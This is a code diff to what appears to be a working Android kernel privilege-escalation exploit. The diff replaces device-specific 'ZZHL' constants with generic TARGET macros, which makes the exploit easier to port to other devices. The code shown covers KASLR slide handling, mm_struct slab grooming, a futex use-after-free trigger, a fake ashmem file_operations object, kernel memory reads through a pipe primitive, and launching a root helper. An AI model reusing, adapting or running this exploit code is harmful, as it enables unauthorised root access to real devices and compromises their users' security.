@@ -1,5 +1,5 @@
 /*
- * Coordinates one ZZHL attempt. Performs preflight checks, locates the
+ * Coordinates one target attempt. Performs preflight checks, locates the
  * kernel, prepares the reclaimed object, runs the futex trigger, verifies
  * kernel access, and starts the root helper while tracking unsafe retry
  * states.
@@ -35,7 +35,7 @@
 #include "10_workqueue_umh_root.h"
 #include "90_diagnostic_checkpoint.h"
 #include "02_slab_cache_probe.h"
-#include "target_zzhl.h"
+#include "target.h"
 
 static int env_int_clamped(const char *name, int fallback, int min,
                             int max) {
@@ -62,9 +62,8 @@ static void fatal_usage(void) {
   exit(-1);
 }
 
-static const int32_t kAttemptDelayOffsetsUsec[8] = {
-  5000, 0, 10000, 30000, -5000, 20000, 15000, 25000,
-};
+static const int32_t kAttemptDelayOffsetsUsec[TARGET_ATTEMPT_DELAY_COUNT] =
+    TARGET_ATTEMPT_DELAYS_USEC;
 
 enum attempt_kernel_state {
   ATTEMPT_PRE_MUTATION = 0,
@@ -153,8 +152,8 @@ static int kernel_image_linear_alias(uint64_t memstart_addr,
                                      uint64_t kimage_voffset,
                                      uint64_t kernel_address,
                                      uint64_t *linear_alias) {
-  if (!linear_alias || (memstart_addr & 0xfffULL) != 0 ||
-      (kimage_voffset & 0xfffULL) != 0 ||
+  if (!linear_alias || (memstart_addr & TARGET_PAGE_MASK) != 0 ||
+      (kimage_voffset & TARGET_PAGE_MASK) != 0 ||
       kernel_address < kimage_voffset) {
     return 0;
   }
@@ -163,17 +162,17 @@ static int kernel_image_linear_alias(uint64_t memstart_addr,
     return 0;
   }
   uint64_t linear_offset = physical - memstart_addr;
-  if (linear_offset >= ZZHL_LINEAR_MAP_END - ZZHL_LINEAR_MAP_BASE) {
+  if (linear_offset >= TARGET_LINEAR_MAP_END - TARGET_LINEAR_MAP_BASE) {
     return 0;
   }
-  *linear_alias = ZZHL_LINEAR_MAP_BASE + linear_offset;
+  *linear_alias = TARGET_LINEAR_MAP_BASE + linear_offset;
   return 1;
 }
 
 static int read_linear_map_inputs(struct do_one_attempt_ctx *ctx, int fd) {
-  if (!oss_kernel_read(fd, ctx->kernel_base + ZZHL_MEMSTART_ADDR_OFF,
+  if (!oss_kernel_read(fd, ctx->kernel_base + TARGET_MEMSTART_ADDR_OFF,
                        &ctx->memstart_addr, sizeof(ctx->memstart_addr)) ||
-      !oss_kernel_read(fd, ctx->kernel_base + ZZHL_KIMAGE_VOFFSET_OFF,
+      !oss_kernel_read(fd, ctx->kernel_base + TARGET_KIMAGE_VOFFSET_OFF,
                        &ctx->kimage_voffset, sizeof(ctx->kimage_voffset))) {
     oss_diag_checkpoint("linear-alias-input-read-failed");
     return 0;
@@ -245,7 +244,7 @@ static void recover_ashmem_fops(struct do_one_attempt_ctx *ctx,
 static int do_one_attempt_post_trigger(void *ctx_v) {
   struct do_one_attempt_ctx *ctx = (struct do_one_attempt_ctx *)ctx_v;
   uint64_t ashmem_misc_fops_addr =
-      ctx->kernel_base + ZZHL_ASHMEM_MISC_FOPS_OFF;
+      ctx->kernel_base + TARGET_ASHMEM_MISC_FOPS_OFF;
   futex_v14_dbg("callback-entry"); /* H0: time from handshake entry to callback */
 
   __atomic_store_n(&ctx->shared->status, ATTEMPT_KERNEL_MUTATED,
@@ -259,7 +258,7 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
      * that would free the reclaimed page while the kernel may still use it. */
     fprintf(stderr, "[immediate] open resolved ashmem node failed\n");
     recover_ashmem_fops(ctx, ashmem_misc_fops_addr,
-                        ctx->kernel_base + ZZHL_ASHMEM_FOPS_OFF);
+                        ctx->kernel_base + TARGET_ASHMEM_FOPS_OFF);
     return 0;
   }
   int verified = oss_verify_kernel_access_ex(
@@ -268,7 +267,7 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
           verified);
   if (!verified) {
     recover_ashmem_fops(ctx, ashmem_misc_fops_addr,
-                        ctx->kernel_base + ZZHL_ASHMEM_FOPS_OFF);
+                        ctx->kernel_base + TARGET_ASHMEM_FOPS_OFF);
     return 0;
   }
 
@@ -277,7 +276,7 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
   if (!read_linear_map_inputs(ctx, fd)) {
     fprintf(stderr, "[immediate] linear alias input read failed\n");
     recover_ashmem_fops(ctx, ashmem_misc_fops_addr,
-                        ctx->kernel_base + ZZHL_ASHMEM_FOPS_OFF);
+                        ctx->kernel_base + TARGET_ASHMEM_FOPS_OFF);
     return 0;
   }
 
@@ -291,7 +290,7 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
   }
   oss_diag_checkpoint("pipe-install-ready");
 
-  uint64_t real_ashmem_fops = ctx->kernel_base + ZZHL_ASHMEM_FOPS_OFF;
+  uint64_t real_ashmem_fops = ctx->kernel_base + TARGET_ASHMEM_FOPS_OFF;
   if (!restore_ashmem_fops_via_pipe(
           ctx, fd, ashmem_misc_fops_addr, real_ashmem_fops)) {
     fprintf(stderr, "[immediate] physical ashmem fops restore failed\n");
@@ -310,7 +309,7 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
   oss_diag_checkpoint(rooted ? "root-umh-ready" : "root-umh-failed");
   uint64_t null_owner = 0;
   int owner_cleared = oss_pipe_rw_write(
-      fd, ctx->payload_base | OSS_PRIMARY_FOPS_LIVE_OFFSET, &null_owner,
+      fd, ctx->payload_base | TARGET_PRIMARY_FOPS_LIVE_OFF, &null_owner,
       sizeof(null_owner));
   fprintf(stderr, "[immediate] fake fops owner clear=%d\n", owner_cleared);
   close(fd);
@@ -371,7 +370,8 @@ static int do_one_attempt(struct attempt_shared_state *shared,
     char *end = NULL;
     p0_offset = strtoull(forced_offset, &end, 0);
     if (errno || end == forced_offset || *end != '\0' ||
-        p0_offset > 0x1f8000ULL || (p0_offset & 0x7fffULL) != 0) {
+        p0_offset > TARGET_KASLR_MAX_SLIDE ||
+        (p0_offset & (TARGET_KASLR_ALIGNMENT - 1ULL)) != 0) {
       fprintf(stderr, "[kaslr] invalid SLIDE_P0_OFFSET\n");
       return 0;
     }
@@ -380,7 +380,7 @@ static int do_one_attempt(struct attempt_shared_state *shared,
     if (!has_forced_offset) {
       return 0;
     }
-    kernel_base = ZZHL_KIMAGE_TEXT_BASE + p0_offset;
+    kernel_base = TARGET_KIMAGE_TEXT_BASE + p0_offset;
     fprintf(stderr,
             "[kaslr] source=forced-p0 base=%016llx p0_offset=%016llx\n",
             (unsigned long long)kernel_base,
@@ -410,9 +410,12 @@ static int do_one_attempt(struct attempt_shared_state *shared,
     fprintf(stderr, "[kaslr] /proc/slabinfo mm_struct line not found\n");
     return 0;
   }
-  if (before.objsize != 1024 || before.objperslab != 32 ||
-      before.pagesperslab != 8 || before.active_objs > 2048 ||
-      before.num_objs > 2048 || before.num_slabs > 48) {
+  if (before.objsize != TARGET_MM_STRUCT_SIZE ||
+      before.objperslab != TARGET_MM_OBJECTS_PER_SLAB ||
+      before.pagesperslab != TARGET_MM_PAGES_PER_SLAB ||
+      before.active_objs > TARGET_MM_PREFLIGHT_MAX_OBJECTS ||
+      before.num_objs > TARGET_MM_PREFLIGHT_MAX_OBJECTS ||
+      before.num_slabs > TARGET_MM_PREFLIGHT_MAX_SLABS) {
     fprintf(stderr,
             "[preflight] mm_struct geometry/load rejected size=%lu per=%lu "
             "pages=%lu active=%lu total=%lu slabs=%lu\n",
@@ -421,9 +424,9 @@ static int do_one_attempt(struct attempt_shared_state *shared,
     return 0;
   }
 
-  uint64_t init_task_addr = kernel_base + ZZHL_INIT_TASK_OFF;
+  uint64_t init_task_addr = kernel_base + TARGET_INIT_TASK_OFF;
   uint64_t ashmem_misc_fops_addr =
-      kernel_base + ZZHL_ASHMEM_MISC_FOPS_OFF;
+      kernel_base + TARGET_ASHMEM_MISC_FOPS_OFF;
 
   uint64_t payload_base = groom_and_install_fops_object(
       kernel_base, ashmem_misc_fops_addr, init_task_addr);
@@ -441,9 +444,9 @@ static int do_one_attempt(struct attempt_shared_state *shared,
   if (!oss_verify_kernel_access_plan_supported(ashmem_misc_fops_addr,
                                                 payload_base) ||
       !oss_kernel_read_plan_supported(
-          kernel_base + ZZHL_MEMSTART_ADDR_OFF, sizeof(uint64_t)) ||
+          kernel_base + TARGET_MEMSTART_ADDR_OFF, sizeof(uint64_t)) ||
       !oss_kernel_read_plan_supported(
-          kernel_base + ZZHL_KIMAGE_VOFFSET_OFF, sizeof(uint64_t))) {
+          kernel_base + TARGET_KIMAGE_VOFFSET_OFF, sizeof(uint64_t))) {
     fprintf(stderr,
             "[preflight] ConfigFS plan rejected before futex "
             "payload=%016llx errno=%d(%s); retry is safe\n",
@@ -510,14 +513,14 @@ static int property_equals(const char *name, const char *expected) {
          strcmp(value, expected) == 0;
 }
 
-static int target_matches_zzhl(void) {
+static int target_matches(void) {
   struct utsname info;
   return uname(&info) == 0 &&
-         strcmp(info.release, ZZHL_KERNEL_RELEASE) == 0 &&
-         property_equals("ro.product.model", ZZHL_MODEL) &&
-         property_equals("ro.product.device", ZZHL_DEVICE) &&
-         property_equals("ro.build.version.incremental", ZZHL_BUILD) &&
-         property_equals("ro.build.fingerprint", ZZHL_FINGERPRINT);
+         strcmp(info.release, TARGET_KERNEL_RELEASE) == 0 &&
+         property_equals("ro.product.model", TARGET_MODEL) &&
+         property_equals("ro.product.device", TARGET_DEVICE) &&
+         property_equals("ro.build.version.incremental", TARGET_BUILD) &&
+         property_equals("ro.build.fingerprint", TARGET_FINGERPRINT);
 }
 
 static int app_main(void) {
@@ -528,10 +531,10 @@ static int app_main(void) {
     fatal_usage();
   }
 
-  if (!target_matches_zzhl()) {
+  if (!target_matches()) {
     fprintf(stderr,
             "[target] refused: expected %s/%s build=%s kernel=%s\n",
-            ZZHL_MODEL, ZZHL_DEVICE, ZZHL_BUILD, ZZHL_KERNEL_RELEASE);
+            TARGET_MODEL, TARGET_DEVICE, TARGET_BUILD, TARGET_KERNEL_RELEASE);
     return 1;
   }
 
